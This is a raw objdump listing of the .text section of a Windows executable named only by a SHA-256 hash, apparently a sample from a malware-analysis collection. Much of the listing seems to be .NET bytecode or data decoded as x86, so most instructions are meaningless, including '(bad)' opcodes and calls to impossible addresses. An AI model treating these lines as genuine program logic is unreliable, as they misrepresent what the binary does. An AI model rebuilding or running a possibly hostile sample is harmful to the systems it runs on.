
ab96929d2404859e0599e6e4356ac6908e71e774841f555ad30626bd96eb5353.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	and    ah,cl
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x808400,al
  402013:	add    BYTE PTR [eax],dh
  402015:	dec    edx
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	or     al,BYTE PTR [eax]
  40201e:	add    BYTE PTR [esi],al
  402020:	xor    BYTE PTR [edx+0x0],cl
  402023:	add    BYTE PTR [esi+esi*1+0x0],dl
  402027:	add    BYTE PTR [eax+0x20],dl
  40202a:	add    BYTE PTR [eax],al
  40202c:	add    BYTE PTR [ecx],al
	...
  40204e:	add    BYTE PTR [eax],al
  402050:	dec    esi
  402051:	out    0x78,eax
  402053:	test   BYTE PTR [edx+ecx*1+0x68b41fc7],bl
  40205a:	mov    dh,0x9e
  40205c:	cdq    
  40205d:	clc    
  40205e:	popf   
  40205f:	(bad)  
  402060:	out    0x6d,eax
  402062:	inc    esp
  402063:	in     al,0xbd
  402065:	fidivr DWORD PTR [esi+ecx*8]
  402068:	pop    edi
  402069:	push   ds
  40206a:	push   ecx
  40206b:	dec    eax
  40206c:	shl    DWORD PTR [ecx],0x99
  40206f:	mov    ebp,0x951d8916
  402074:	mov    esp,0x72619932
  402079:	mov    edi,0xa189a9c1
  40207e:	ja     0x4020af
  402080:	cmp    BYTE PTR [ebp-0x31],cl
  402083:	sub    eax,edx
  402085:	jl     0x402062
  402087:	stc    
  402088:	inc    edi
  402089:	ds loop 0x4020ad
  40208c:	sub    ecx,DWORD PTR [ecx-0x127866f3]
  402092:	push   ds
  402093:	or     DWORD PTR [eax-0x1e],edx
  402096:	jle    0x4020a3
  402098:	ret    0xe974
  40209b:	dec    ebp
  40209c:	jae    0x4020e7
  40209e:	fdivr  QWORD PTR [edx+0xda135be]
  4020a4:	sub    DWORD PTR [eax-0x62217431],edi
  4020aa:	es push ebp
  4020ac:	nop
  4020ad:	inc    eax
  4020ae:	call   0xfa6a24cc
  4020b3:	cdq    
  4020b4:	adc    BYTE PTR [eax],0xfe
  4020b7:	cld    
  4020b8:	out    0x7f,eax
  4020ba:	pop    esi
  4020bb:	sub    al,0x73
  4020bd:	test   BYTE PTR [eax-0x40],bl
  4020c0:	dec    ebp
  4020c1:	and    bh,BYTE PTR [edi]
  4020c3:	jle    0x4020a9
  4020c5:	sbb    eax,0x26adaf2
  4020ca:	jg     0x4020e0
  4020cc:	lods   al,BYTE PTR ds:[esi]
  4020cd:	push   esi
  4020ce:	push   ds
  4020cf:	call   0x65d56e19
  4020d4:	call   0xb7d08707
  4020d9:	add    BYTE PTR [esi+0x11e76220],ah
  4020df:	mov    edi,DWORD PTR [eax+0x23]
  4020e2:	push   eax
  4020e3:	loopne 0x402118
  4020e5:	pusha  
  4020e6:	mov    dl,0xf8
  4020e8:	cmp    DWORD PTR [ebx+0xe24575c],eax
  4020ee:	mov    al,ds:0x4d4e5450
  4020f3:	push   eax
  4020f4:	dec    ebp
  4020f5:	and    ebx,DWORD PTR [ebx-0x5e]
  4020f8:	mov    ebp,0x51efd58c
  4020fd:	dec    esp
  4020fe:	std    
  4020ff:	push   ds
  402100:	fstp   TBYTE PTR [ebx]
  402102:	jns    0x40213b
  402104:	ret    0xe6ac
  402107:	(bad)  [ebx+ecx*4+0x1c695914]
  40210e:	sbb    eax,0xc99c5b51
  402113:	jno    0x40215d
  402115:	fsub   DWORD PTR [edx-0x2a22505]
  40211b:	or     DWORD PTR [esi],ecx
  40211d:	mov    esp,0xf167fdde
  402122:	push   edi
  402123:	test   BYTE PTR [edi+0x21],0xdb
  402127:	les    ebp,FWORD PTR [esi]
  402129:	push   esi
  40212a:	call   0x6057:0x515540fa
  402131:	fsubr  DWORD PTR [edx]
  402133:	clc    
  402134:	cmp    BYTE PTR [ebx+0x52239ae3],dh
  40213a:	inc    ebx
  40213b:	adc    edx,eax
  40213d:	add    ebp,DWORD PTR [edi]
  40213f:	test   ecx,edx
  402141:	les    ebp,FWORD PTR [ebx+ebp*2-0x52]
  402145:	jne    0x402152
  402147:	sub    cl,BYTE PTR [esi+ecx*1-0x6d]
  40214b:	lods   eax,DWORD PTR ds:[esi]
  40214c:	data16 jo 0x402100
  40214f:	mov    BYTE PTR [ebx],al
  402151:	xor    BYTE PTR [ecx],al
  402153:	add    BYTE PTR [eax+0x0],ah
  402156:	add    BYTE PTR [eax],al
  402158:	add    BYTE PTR [eax],al
  40215a:	add    BYTE PTR [eax],al
  40215c:	sub    BYTE PTR [edi],dl
  40215e:	add    BYTE PTR [eax],al
  402160:	or     ch,BYTE PTR [eax]
  402162:	aas    
  402163:	add    BYTE PTR [eax],al
  402165:	push   es
  402166:	sub    BYTE PTR [eax],bl
  402168:	add    BYTE PTR [eax],al
  40216a:	or     ch,BYTE PTR [eax]
  40216c:	pop    ss
  40216d:	add    BYTE PTR [eax],al
  40216f:	or     ch,BYTE PTR [eax]
  402171:	add    BYTE PTR cs:[eax],al
  402174:	push   es
  402175:	sub    BYTE PTR [eax],bl
  402177:	add    BYTE PTR [eax],al
  402179:	or     ch,BYTE PTR [eax]
  40217b:	pop    ss
  40217c:	add    BYTE PTR [eax],al
  40217e:	or     ch,BYTE PTR [eax]
  402180:	xor    BYTE PTR [eax],al
  402182:	add    BYTE PTR [esi],al
  402184:	sub    BYTE PTR [eax],bl
  402186:	add    BYTE PTR [eax],al
  402188:	or     ch,BYTE PTR [eax]
  40218a:	pop    ss
  40218b:	add    BYTE PTR [eax],al
  40218d:	or     ch,BYTE PTR [eax]
  40218f:	das    
  402190:	add    BYTE PTR [eax],al
  402192:	push   es
  402193:	sub    BYTE PTR [eax],bl
  402195:	add    BYTE PTR [eax],al
  402197:	or     ch,BYTE PTR [eax]
  402199:	pop    ss
  40219a:	add    BYTE PTR [eax],al
  40219c:	or     ch,BYTE PTR [eax]
  40219e:	xor    al,BYTE PTR [eax]
  4021a0:	add    BYTE PTR [esi],al
  4021a2:	sub    BYTE PTR [eax],bl
  4021a4:	add    BYTE PTR [eax],al
  4021a6:	or     ch,BYTE PTR [eax]
  4021a8:	pop    ss
  4021a9:	add    BYTE PTR [eax],al
  4021ab:	or     ch,BYTE PTR [eax]
  4021ad:	xor    DWORD PTR [eax],eax
  4021af:	add    BYTE PTR [esi],al
  4021b1:	sub    BYTE PTR [eax],bl
  4021b3:	add    BYTE PTR [eax],al
  4021b5:	or     ch,BYTE PTR [eax]
  4021b7:	pop    ss
  4021b8:	add    BYTE PTR [eax],al
  4021ba:	or     ch,BYTE PTR [edx]
  4021bc:	adc    esi,DWORD PTR [eax]
  4021be:	push   es
  4021bf:	add    ah,bl
  4021c1:	add    al,BYTE PTR [eax]
  4021c3:	add    BYTE PTR [ecx],al
  4021c5:	add    BYTE PTR [eax],al
  4021c7:	adc    DWORD PTR [edx+0x1],esi
  4021ca:	add    BYTE PTR [eax],al
  4021cc:	jo     0x4021f6
  4021ce:	sbb    DWORD PTR [eax],eax
  4021d0:	add    BYTE PTR [edx],cl
  4021d2:	add    ch,BYTE PTR [edi+0x1a]
  4021d5:	add    BYTE PTR [eax],al
  4021d7:	or     ch,BYTE PTR [edi+0x1b]
  4021da:	add    BYTE PTR [eax],al
  4021dc:	or     ch,BYTE PTR [eax]
  4021de:	sbb    BYTE PTR [eax],al
  4021e0:	add    BYTE PTR [edx],cl
  4021e2:	jb     0x4021f3
  4021e4:	add    BYTE PTR [eax],al
  4021e6:	jo     0x402210
  4021e8:	sbb    DWORD PTR [eax],eax
  4021ea:	add    BYTE PTR [edx],cl
  4021ec:	add    bh,BYTE PTR [esi+0x1c]
  4021ef:	add    BYTE PTR [eax],al
  4021f1:	or     bh,BYTE PTR [esi+0x1d]
  4021f4:	add    BYTE PTR [eax],al
  4021f6:	or     ch,BYTE PTR [edi+0x1e]
  4021f9:	add    BYTE PTR [eax],al
  4021fb:	or     ch,BYTE PTR [eax]
  4021fd:	sbb    BYTE PTR [eax],al
  4021ff:	add    BYTE PTR [edx],cl
  402201:	sub    BYTE PTR [edi],dl
  402203:	add    BYTE PTR [eax],al
  402205:	or     ch,BYTE PTR [eax]
  402207:	xor    al,0x0
  402209:	add    BYTE PTR [esi],al
  40220b:	sub    BYTE PTR [ecx],bl
  40220d:	add    BYTE PTR [eax],al
  40220f:	or     al,BYTE PTR [edx]
  402211:	outs   dx,DWORD PTR ds:[esi]
  402212:	sbb    al,BYTE PTR [eax]
  402214:	add    BYTE PTR [edx],cl
  402216:	outs   dx,DWORD PTR ds:[esi]
  402217:	pop    ds
  402218:	add    BYTE PTR [eax],al
  40221a:	or     al,BYTE PTR [edx]
  40221c:	outs   dx,DWORD PTR ds:[esi]
  40221d:	and    BYTE PTR [eax],al
  40221f:	add    BYTE PTR [edx],cl
  402221:	sub    BYTE PTR [ecx],ah
  402223:	add    BYTE PTR [eax],al
  402225:	or     cl,BYTE PTR [edx]
  402227:	push   es
  402228:	adc    ecx,DWORD PTR [edx]
  40222a:	adc    DWORD PTR [edx],ecx
  40222c:	inc    ebp
  40222d:	add    eax,0xe000000
  402232:	add    BYTE PTR [eax],al
  402234:	add    BYTE PTR [edx],dh
  402236:	add    BYTE PTR [eax],al
  402238:	add    BYTE PTR [esi],ah
  40223a:	add    BYTE PTR [eax],al
  40223c:	add    BYTE PTR [edx],bl
  40223e:	add    BYTE PTR [eax],al
  402240:	add    BYTE PTR [edx],al
  402242:	add    BYTE PTR [eax],al
  402244:	add    BYTE PTR [ebx],ch
  402246:	xor    BYTE PTR [eax],ch
  402248:	sbb    eax,0x28060000
  40224d:	sbb    BYTE PTR [eax],al
  40224f:	add    BYTE PTR [edx],cl
  402251:	sub    ebp,DWORD PTR [esi]
  402253:	sub    BYTE PTR [esi],dh
  402255:	add    BYTE PTR [eax],al
  402257:	push   es
  402258:	sub    BYTE PTR [eax],bl
  40225a:	add    BYTE PTR [eax],al
  40225c:	or     ch,BYTE PTR [ebx]
  40225e:	and    ch,BYTE PTR [eax]
  402260:	pop    esp
  402261:	add    BYTE PTR [eax],al
  402263:	push   es
  402264:	sub    BYTE PTR [eax],bl
  402266:	add    BYTE PTR [eax],al
  402268:	or     ch,BYTE PTR [ebx]
  40226a:	push   ss
  40226b:	sub    BYTE PTR [ebp+0x0],bl
  40226e:	add    BYTE PTR [esi],al
  402270:	sub    BYTE PTR [eax],bl
  402272:	add    BYTE PTR [eax],al
  402274:	or     ch,BYTE PTR [ebx]
  402276:	or     ch,BYTE PTR [eax]
  402278:	pop    eax
  402279:	add    BYTE PTR [eax],al
  40227b:	push   es
  40227c:	sub    BYTE PTR [eax],bl
  40227e:	add    BYTE PTR [eax],al
  402280:	or     al,BYTE PTR [esi]
  402282:	sbb    dh,BYTE PTR [ebx]
  402284:	jne    0x4022ae
  402286:	sub    eax,0x28060000
  40228b:	sbb    DWORD PTR [eax],eax
  40228d:	add    BYTE PTR [edx],cl
  40228f:	add    ch,BYTE PTR [eax]
  402291:	and    al,BYTE PTR [eax]
  402293:	add    BYTE PTR [edx],cl
  402295:	or     eax,DWORD PTR [edi]
  402297:	mov    WORD PTR [ecx],?
  402299:	add    BYTE PTR [eax],al
  40229b:	add    DWORD PTR [eax],ebp
  40229d:	and    eax,DWORD PTR [eax]
  40229f:	add    BYTE PTR [edx],cl
  4022a1:	sub    BYTE PTR [edi+0x0],al
  4022a4:	add    BYTE PTR [esi],al
  4022a6:	sub    BYTE PTR [ecx],bl
  4022a8:	add    BYTE PTR [eax],al
  4022aa:	or     al,BYTE PTR [edx]
  4022ac:	jle    0x4022d2
  4022ae:	add    BYTE PTR [eax],al
  4022b0:	or     bh,BYTE PTR [esi+0x1d]
  4022b3:	add    BYTE PTR [eax],al
  4022b5:	or     ch,BYTE PTR [edi+0x1e]
  4022b8:	add    BYTE PTR [eax],al
  4022ba:	or     cl,BYTE PTR [eax+ecx*1]
  4022bd:	jle    0x4022c5
  4022bf:	add    BYTE PTR [eax],al
  4022c1:	add    al,0x6f
  4022c3:	and    eax,0x1b0a0000
  4022c8:	sub    BYTE PTR [esi],ah
  4022ca:	add    BYTE PTR [eax],al
  4022cc:	or     ch,BYTE PTR [esp+ecx*1]
  4022cf:	sub    BYTE PTR [eax+eax*1],ch
  4022d2:	add    BYTE PTR [esi],al
  4022d4:	sub    BYTE PTR [eax],bl
  4022d6:	add    BYTE PTR [eax],al
  4022d8:	or     ch,BYTE PTR [ebx]
  4022da:	pop    esp
  4022db:	add    bh,BYTE PTR [esi+0x27]
  4022de:	add    BYTE PTR [eax],al
  4022e0:	or     dl,BYTE PTR [edi+ebp*2]
  4022e3:	push   ds
  4022e4:	add    BYTE PTR [eax],al
  4022e6:	or     cl,BYTE PTR ds:0x282809
  4022ec:	add    BYTE PTR [edx],cl
  4022ee:	sub    al,0x2
  4022f0:	or     BYTE PTR ds:0x182809,cl
  4022f6:	add    BYTE PTR [edx],cl
  4022f8:	sub    edi,DWORD PTR ds:0x4028
  4022fe:	push   es
  4022ff:	sub    BYTE PTR [ecx],bl
  402301:	add    BYTE PTR [eax],al
  402303:	or     al,BYTE PTR [edx]
  402305:	sub    BYTE PTR [ecx],ch
  402307:	add    BYTE PTR [eax],al
  402309:	or     ch,BYTE PTR [eax]
  40230b:	sbb    BYTE PTR [eax],al
  40230d:	add    BYTE PTR [edx],cl
  40230f:	add    bh,BYTE PTR [esi+0x2a]
  402312:	add    BYTE PTR [eax],al
  402314:	or     dl,BYTE PTR [edi+ebp*2]
  402317:	push   ds
  402318:	add    BYTE PTR [eax],al
  40231a:	or     dl,BYTE PTR [ebx]
  40231c:	add    al,0x11
  40231e:	add    al,0x28
  402320:	sub    BYTE PTR [eax],al
  402322:	add    BYTE PTR [edx],cl
  402324:	sub    eax,0x412811
  402329:	add    BYTE PTR [esi],al
  40232b:	sub    BYTE PTR [ecx],bl
  40232d:	add    BYTE PTR [eax],al
  40232f:	or     dl,BYTE PTR [ecx]
  402331:	add    al,0x28
  402333:	sbb    BYTE PTR [eax],al
  402335:	add    BYTE PTR [edx],cl
  402337:	add    ch,BYTE PTR [edi+0x2b]
  40233a:	add    BYTE PTR [eax],al
  40233c:	or     ch,BYTE PTR [edi+0x2c]
  40233f:	add    BYTE PTR [eax],al
  402341:	or     ch,BYTE PTR [edx*1+0x2528]
  402348:	push   es
  402349:	sub    BYTE PTR [ecx],bl
  40234b:	add    BYTE PTR [eax],al
  40234d:	or     al,BYTE PTR [edx]
  40234f:	outs   dx,DWORD PTR ds:[esi]
  402350:	sub    eax,DWORD PTR [eax]
  402352:	add    BYTE PTR [edx],cl
  402354:	sub    BYTE PTR [eax],bl
  402356:	add    BYTE PTR [eax],al
  402358:	or     al,BYTE PTR [edx]
  40235a:	jle    0x402389
  40235c:	add    BYTE PTR [eax],al
  40235e:	or     dl,BYTE PTR [edi+ebp*2]
  402361:	push   ds
  402362:	add    BYTE PTR [eax],al
  402364:	or     dl,BYTE PTR [ebx]
  402366:	add    eax,0x28280511
  40236b:	add    BYTE PTR [eax],al
  40236d:	or     ch,BYTE PTR ds:0x242811
  402373:	add    BYTE PTR [esi],al
  402375:	sub    BYTE PTR [ecx],bl
  402377:	add    BYTE PTR [eax],al
  402379:	or     dl,BYTE PTR [ecx]
  40237b:	add    eax,0x1828
  402380:	or     al,BYTE PTR [edx]
  402382:	outs   dx,DWORD PTR ds:[esi]
  402383:	add    BYTE PTR cs:[eax],al
  402386:	or     bh,BYTE PTR [ecx]
  402388:	xchg   BYTE PTR [eax],al
  40238a:	add    BYTE PTR [eax],al
  40238c:	add    ch,BYTE PTR [edi+0x2e]
  40238f:	add    BYTE PTR [eax],al
  402391:	or     cl,BYTE PTR [esi+0x7b311669]
  402397:	jle    0x4023b6
  402399:	add    BYTE PTR [eax],al
  40239b:	or     ch,BYTE PTR [eax]
  40239d:	sbb    BYTE PTR [eax],al
  40239f:	add    BYTE PTR [edx],cl
  4023a1:	sub    BYTE PTR [edi],ch
  4023a3:	add    BYTE PTR [eax],al
  4023a5:	or     ch,BYTE PTR [eax]
  4023a7:	inc    ebx
  4023a8:	add    BYTE PTR [eax],al
  4023aa:	push   es
  4023ab:	pop    ss
  4023ac:	lea    eax,[ecx]
  4023ae:	add    BYTE PTR [eax],al
  4023b0:	add    DWORD PTR [ebx],edx
  4023b2:	or     edx,DWORD PTR [ecx]
  4023b4:	or     edx,DWORD PTR [esi]
  4023b6:	add    ch,BYTE PTR [edi+0x2e]
  4023b9:	add    BYTE PTR [eax],al
  4023bb:	or     cl,BYTE PTR [esi+0x120c1369]
  4023c1:	or     al,0x28
  4023c3:	xor    BYTE PTR [eax],al
  4023c5:	add    BYTE PTR [edx],cl
  4023c7:	sub    BYTE PTR [ecx],dh
  4023c9:	add    BYTE PTR [eax],al
  4023cb:	or     ah,BYTE PTR [edx+0x32280b11]
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	or     ch,BYTE PTR [eax]
  4023d5:	sbb    BYTE PTR [eax],al
  4023d7:	add    BYTE PTR [edx],cl
  4023d9:	jle    0x4023e1
  4023db:	add    BYTE PTR [eax],al
  4023dd:	add    al,0x2
  4023df:	outs   dx,DWORD PTR ds:[esi]
  4023e0:	add    BYTE PTR cs:[eax],al
  4023e3:	or     dl,BYTE PTR [esi]
  4023e5:	pop    ss
  4023e6:	outs   dx,DWORD PTR ds:[esi]
  4023e7:	xor    eax,DWORD PTR [eax]
  4023e9:	add    BYTE PTR [edx],cl
  4023eb:	adc    eax,DWORD PTR [esi]
  4023ed:	adc    DWORD PTR [esi],eax
  4023ef:	adc    ecx,DWORD PTR ds:0x2b0e1316
  4023f5:	adc    al,0x11
  4023f7:	or     eax,0x139a0e11
  4023fc:	pop    es
  4023fd:	adc    DWORD PTR [edi],eax
  4023ff:	sub    BYTE PTR [ebx],al
  402401:	add    BYTE PTR [eax],al
  402403:	push   es
  402404:	adc    DWORD PTR [esi],ecx
  402406:	pop    ss
  402407:	pop    eax
  402408:	adc    ecx,DWORD PTR [esi]
  40240a:	adc    DWORD PTR [esi],ecx
  40240c:	adc    DWORD PTR ds:0xe432698e,ecx
  402412:	add    ch,BYTE PTR [edi+0x34]
  402415:	add    BYTE PTR [eax],al
  402417:	or     bh,BYTE PTR [ecx]
  402419:	xchg   BYTE PTR [eax],al
  40241b:	add    BYTE PTR [eax],al
  40241d:	add    ch,BYTE PTR [edi+0x34]
  402420:	add    BYTE PTR [eax],al
  402422:	or     cl,BYTE PTR [esi+0x7b311669]
  402428:	jle    0x402447
  40242a:	add    BYTE PTR [eax],al
  40242c:	or     ch,BYTE PTR [eax]
  40242e:	sbb    BYTE PTR [eax],al
  402430:	add    BYTE PTR [edx],cl
  402432:	sub    BYTE PTR [edi],ch
  402434:	add    BYTE PTR [eax],al
  402436:	or     ch,BYTE PTR [eax]
  402438:	inc    edx
  402439:	add    BYTE PTR [eax],al
  40243b:	push   es
  40243c:	pop    ss
  40243d:	lea    eax,[ecx]
  40243f:	add    BYTE PTR [eax],al
  402441:	add    DWORD PTR [ebx],edx
  402443:	movups XMMWORD PTR [edi],xmm1
  402446:	push   ss
  402447:	add    ch,BYTE PTR [edi+0x34]
  40244a:	add    BYTE PTR [eax],al
  40244c:	or     cl,BYTE PTR [esi+0x12101369]
  402452:	adc    BYTE PTR [eax],ch
  402454:	xor    BYTE PTR [eax],al
  402456:	add    BYTE PTR [edx],cl
  402458:	sub    BYTE PTR [ecx],dh
  40245a:	add    BYTE PTR [eax],al
  40245c:	or     ah,BYTE PTR [edx+0x32280f11]
  402462:	add    BYTE PTR [eax],al
  402464:	or     ch,BYTE PTR [eax]
  402466:	sbb    BYTE PTR [eax],al
  402468:	add    BYTE PTR [edx],cl
  40246a:	jle    0x402472
  40246c:	add    BYTE PTR [eax],al
  40246e:	add    al,0x2
  402470:	outs   dx,DWORD PTR ds:[esi]
  402471:	xor    al,0x0
  402473:	add    BYTE PTR [edx],cl
  402475:	push   ss
  402476:	pop    ss
  402477:	outs   dx,DWORD PTR ds:[esi]
  402478:	xor    eax,DWORD PTR [eax]
  40247a:	add    BYTE PTR [edx],cl
  40247c:	adc    ecx,DWORD PTR [eax]
  40247e:	adc    DWORD PTR [eax],ecx
  402480:	adc    edx,DWORD PTR [ecx]
  402482:	push   ss
  402483:	adc    edx,DWORD PTR [edx]
  402485:	sub    edx,DWORD PTR [ecx+edx*1]
  402488:	adc    DWORD PTR [ecx],edx
  40248a:	adc    bl,BYTE PTR [edx+0x9110913]
  402490:	sub    BYTE PTR [ebx],al
  402492:	add    BYTE PTR [eax],al
  402494:	push   es
  402495:	adc    DWORD PTR [edx],edx
  402497:	pop    ss
  402498:	pop    eax
  402499:	adc    edx,DWORD PTR [edx]
  40249b:	adc    DWORD PTR [edx],edx
  40249d:	adc    DWORD PTR [ecx],edx
  40249f:	mov    gs,WORD PTR [ecx+0x32]
  4024a2:	in     al,0x2a
  4024a4:	adc    esi,DWORD PTR [eax]
  4024a6:	add    al,0x0
  4024a8:	add    DWORD PTR [bx+si],eax
  4024ab:	add    BYTE PTR [edx],al
  4024ad:	add    BYTE PTR [eax],al
  4024af:	adc    DWORD PTR [edx],eax
  4024b1:	sub    eax,0x46280b
  4024b6:	add    BYTE PTR [esi],al
  4024b8:	sub    BYTE PTR [eax],bl
  4024ba:	add    BYTE PTR [eax],al
  4024bc:	or     ch,BYTE PTR [edx]
  4024be:	add    ch,BYTE PTR [edi+0x1a]
  4024c1:	add    BYTE PTR [eax],al
  4024c3:	or     ch,BYTE PTR [edi+0x1f]
  4024c6:	add    BYTE PTR [eax],al
  4024c8:	or     al,BYTE PTR [edx]
  4024ca:	outs   dx,DWORD PTR ds:[esi]
  4024cb:	and    BYTE PTR [eax],al
  4024cd:	add    BYTE PTR [edx],cl
  4024cf:	sub    BYTE PTR [ecx],ah
  4024d1:	add    BYTE PTR [eax],al
  4024d3:	or     cl,BYTE PTR [edx]
  4024d5:	push   es
  4024d6:	or     al,0x8
  4024d8:	inc    ebp
  4024d9:	add    eax,0x6b000000
  4024de:	add    BYTE PTR [eax],al
  4024e0:	add    BYTE PTR [edi+0x0],dh
  4024e3:	add    BYTE PTR [eax],al
  4024e5:	add    al,BYTE PTR [eax]
  4024e7:	add    BYTE PTR [eax],al
  4024e9:	push   cs
  4024ea:	add    BYTE PTR [eax],al
  4024ec:	add    BYTE PTR [edx],bl
  4024ee:	add    BYTE PTR [eax],al
  4024f0:	add    BYTE PTR [ebx],ch
  4024f2:	jne    0x402566
  4024f4:	sbb    eax,DWORD PTR [eax]
  4024f6:	add    BYTE PTR [eax+0x28],dh
  4024f9:	sbb    DWORD PTR [eax],eax
  4024fb:	add    BYTE PTR [edx],cl
  4024fd:	sub    esi,DWORD PTR [ebx+0x72]
  402500:	sub    DWORD PTR [eax],eax
  402502:	add    BYTE PTR [eax+0x28],dh
  402505:	sbb    DWORD PTR [eax],eax
  402507:	add    BYTE PTR [edx],cl
  402509:	sub    esp,DWORD PTR [edi+0x2]
  40250c:	sub    BYTE PTR [edx],ah
  40250e:	add    BYTE PTR [eax],al
  402510:	or     cl,BYTE PTR [ebx]
  402512:	pop    es
  402513:	or     eax,0x44509
  402518:	add    BYTE PTR [eax],al
  40251a:	add    al,BYTE PTR [eax]
  40251c:	add    BYTE PTR [eax],al
  40251e:	push   cs
  40251f:	add    BYTE PTR [eax],al
  402521:	add    BYTE PTR [esi],ah
  402523:	add    BYTE PTR [eax],al
  402525:	add    BYTE PTR [edx],bl
  402527:	add    BYTE PTR [eax],al
  402529:	add    BYTE PTR [ebx],ch
  40252b:	inc    esi
  40252c:	jb     0x402565
  40252e:	add    BYTE PTR [eax],al
  402530:	jo     0x40255a
  402532:	sbb    DWORD PTR [eax],eax
  402534:	add    BYTE PTR [edx],cl
  402536:	sub    edi,DWORD PTR [edx]
  402538:	jb     0x40257f
  40253a:	add    BYTE PTR [eax],al
  40253c:	jo     0x402566
  40253e:	sbb    DWORD PTR [eax],eax
  402540:	add    BYTE PTR [edx],cl
  402542:	sub    ebp,DWORD PTR [esi]
  402544:	jb     0x402599
  402546:	add    BYTE PTR [eax],al
  402548:	jo     0x402572
  40254a:	sbb    DWORD PTR [eax],eax
  40254c:	add    BYTE PTR [edx],cl
  40254e:	sub    esp,DWORD PTR [edx]
  402550:	jb     0x4025b3
  402552:	add    BYTE PTR [eax],al
  402554:	jo     0x40257e
  402556:	sbb    DWORD PTR [eax],eax
  402558:	add    BYTE PTR [edx],cl
  40255a:	sub    edx,DWORD PTR [esi]
  40255c:	jb     0x4025cd
  40255e:	add    BYTE PTR [eax],al
  402560:	jo     0x40258a
  402562:	sbb    DWORD PTR [eax],eax
  402564:	add    BYTE PTR [edx],cl
  402566:	sub    ecx,DWORD PTR [edx]
  402568:	jb     0x4025e7
  40256a:	add    BYTE PTR [eax],al
  40256c:	jo     0x402596
  40256e:	sbb    DWORD PTR [eax],eax
  402570:	add    BYTE PTR [edx],cl
  402572:	sub    BYTE PTR ds:0x20a0000,dh
  402578:	outs   dx,DWORD PTR ds:[esi]
  402579:	sbb    al,BYTE PTR [eax]
  40257b:	add    BYTE PTR [edx],cl
  40257d:	outs   dx,DWORD PTR ds:[esi]
  40257e:	pop    ds
  40257f:	add    BYTE PTR [eax],al
  402581:	or     bh,BYTE PTR [esi+0x36]
  402584:	add    BYTE PTR [eax],al
  402586:	or     ch,BYTE PTR [edi+0x37]
  402589:	add    BYTE PTR [eax],al
  40258b:	or     ch,BYTE PTR [esp+ecx*1]
  40258e:	add    ch,BYTE PTR [eax]
  402590:	sub    DWORD PTR [eax],eax
  402592:	add    BYTE PTR [edx],cl
  402594:	sub    BYTE PTR [eax],bl
  402596:	add    BYTE PTR [eax],al
  402598:	or     ch,BYTE PTR [edx]
  40259a:	add    ch,BYTE PTR [edi+0x2b]
  40259d:	add    BYTE PTR [eax],al
  40259f:	or     al,BYTE PTR [edx]
  4025a1:	jle    0x4025db
  4025a3:	add    BYTE PTR [eax],al
  4025a5:	or     bh,BYTE PTR [esi+0x1d]
  4025a8:	add    BYTE PTR [eax],al
  4025aa:	or     ch,BYTE PTR [edi+0x1e]
  4025ad:	add    BYTE PTR [eax],al
  4025af:	or     ch,BYTE PTR [eax]
  4025b1:	cmp    DWORD PTR [eax],eax
  4025b3:	add    BYTE PTR [edx],cl
  4025b5:	sub    eax,0x2b6f0212
  4025ba:	add    BYTE PTR [eax],al
  4025bc:	or     ch,BYTE PTR [edi+0x3a]
  4025bf:	add    BYTE PTR [eax],al
  4025c1:	or     ch,BYTE PTR [edi+0x2c]
  4025c4:	add    BYTE PTR [eax],al
  4025c6:	or     ch,BYTE PTR ds:0x2928020c
  4025cc:	add    BYTE PTR [eax],al
  4025ce:	or     ch,BYTE PTR [eax]
  4025d0:	sbb    BYTE PTR [eax],al
  4025d2:	add    BYTE PTR [edx],cl
  4025d4:	sub    bl,BYTE PTR [edx]
  4025d6:	lea    eax,[ecx]
  4025d8:	add    BYTE PTR [eax],al
  4025da:	add    DWORD PTR [ebx],edx
  4025dc:	add    al,0x11
  4025de:	add    al,0x16
  4025e0:	add    ch,BYTE PTR [eax]
  4025e2:	sub    DWORD PTR [eax],eax
  4025e4:	add    BYTE PTR [edx],cl
  4025e6:	mov    ds:0x72170411,al
  4025eb:	mov    eax,DWORD PTR [eax]
  4025ed:	add    BYTE PTR [eax-0x5e],dh
  4025f0:	adc    DWORD PTR [eax+ebx*1],eax
  4025f3:	add    ch,BYTE PTR [edi+0x2b]
  4025f6:	add    BYTE PTR [eax],al
  4025f8:	or     ch,BYTE PTR [edi+0x3a]
  4025fb:	add    BYTE PTR [eax],al
  4025fd:	or     ah,BYTE PTR [edx+0x1f190411]
  402603:	sub    DWORD PTR [eax+edi*1-0x5dff0000],ecx
  40260a:	adc    DWORD PTR [eax+ebp*1],eax
  40260d:	cmp    eax,DWORD PTR [eax]
  40260f:	add    BYTE PTR [edx],cl
  402611:	sub    BYTE PTR [eax],bl
  402613:	add    BYTE PTR [eax],al
  402615:	or     ch,BYTE PTR [edx]
  402617:	add    BYTE PTR [ebx],bl
  402619:	xor    BYTE PTR [eax+eax*1],al
  40261c:	cld    
  40261d:	add    BYTE PTR [eax],al
  40261f:	add    BYTE PTR [ebx],al
  402621:	add    BYTE PTR [eax],al
  402623:	adc    DWORD PTR [esi+0x6],edi
  402626:	add    BYTE PTR [eax],al
  402628:	add    al,0x3
  40262a:	outs   dx,DWORD PTR ds:[esi]
  40262b:	cmp    al,0x0
  40262d:	add    BYTE PTR [edx],cl
  40262f:	push   ss
  402630:	pop    ss
  402631:	outs   dx,DWORD PTR ds:[esi]
  402632:	cmp    eax,0xa0a0000
  402637:	add    ch,BYTE PTR [edi+0x3e]
  40263a:	add    BYTE PTR [eax],al
  40263c:	or     ch,BYTE PTR [edi+0x3f]
  40263f:	add    BYTE PTR [eax],al
  402641:	or     dl,BYTE PTR [ebx]
  402643:	add    eax,0xbc38
  402648:	add    BYTE PTR [ecx],dl
  40264a:	add    eax,0x406f
  40264f:	or     cl,BYTE PTR [ebx]
  402651:	add    ebp,DWORD PTR [edi+0x41]
  402654:	add    BYTE PTR [eax],al
  402656:	or     al,BYTE PTR [edi]
  402658:	outs   dx,DWORD PTR ds:[esi]
  402659:	inc    edx
  40265a:	add    BYTE PTR [eax],al
  40265c:	or     bl,BYTE PTR [edi+0x16]
  40265f:	inc    BYTE PTR [ecx]
  402661:	push   ss
  402662:	inc    BYTE PTR [ecx]
  402664:	or     al,0x3
